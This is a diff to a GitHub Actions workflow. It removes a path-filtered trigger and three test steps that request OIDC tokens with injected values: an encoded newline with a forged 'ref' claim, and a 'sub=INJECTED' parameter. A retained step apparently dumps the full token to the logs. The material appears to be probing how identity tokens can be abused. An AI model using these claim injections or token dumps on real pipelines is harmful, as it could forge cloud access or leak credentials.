@@ -3,8 +3,6 @@ on:
   push:
     branches:
       - main
-    paths:
-      - trigger.txt
 permissions:
   contents: read
   id-token: write
@@ -13,52 +11,6 @@ jobs:
     runs-on: ubuntu-latest
     environment: production
     steps:
-      - name: Test 1 - Standard audience
-        run: |
-          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
-          P=$(echo "$T" | cut -d. -f2)
-          echo "=== Test 1 Standard ==="
-          echo "$P" | python3 -c "
-import sys,base64,json; d=sys.stdin.read().strip()
-p=d+'='*(4-len(d)%4)
-c=json.loads(base64.urlsafe_b64decode(p))
-print('aud:', repr(c.get('aud')))
-print('sub:', c.get('sub'))
-print('event:', c.get('event_name'))
-print('ref:', c.get('ref'))
-print('actor:', c.get('actor'))"
-
-      - name: Test 2 - Newline injection
-        run: |
-          R=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%0aref%3Arefs%2Fheads%2Fmain" 2>&1) || true
-          echo "=== Test 2 Newline injection ==="
-          echo "$R" | jq -r '.value // empty' 2>/dev/null | cut -d. -f2 | python3 -c "
-import sys,base64,json; d=sys.stdin.read().strip()
-if not d: print('EMPTY/REJECTED'); exit()
-p=d+'='*(4-len(d)%4)
-try:
-  c=json.loads(base64.urlsafe_b64decode(p))
-  print('aud:', repr(c.get('aud')))
-except Exception as e:
-  print('Error:', e)" 2>/dev/null || echo "REJECTED/FAILED"
-
-      - name: Test 3 - Sub param injection
-        run: |
-          R=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com&sub=INJECTED" 2>&1) || true
-          echo "=== Test 3 Sub injection ==="
-          echo "$R" | jq -r '.value // empty' 2>/dev/null | cut -d. -f2 | python3 -c "
-import sys,base64,json; d=sys.stdin.read().strip()
-if not d: print('EMPTY/REJECTED'); exit()
-p=d+'='*(4-len(d)%4)
-try:
-  c=json.loads(base64.urlsafe_b64decode(p))
-  print('sub:', repr(c.get('sub')))
-except Exception as e:
-  print('Error:', e)" 2>/dev/null || echo "REJECTED"
-
       - name: Full token dump
         run: |
           T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
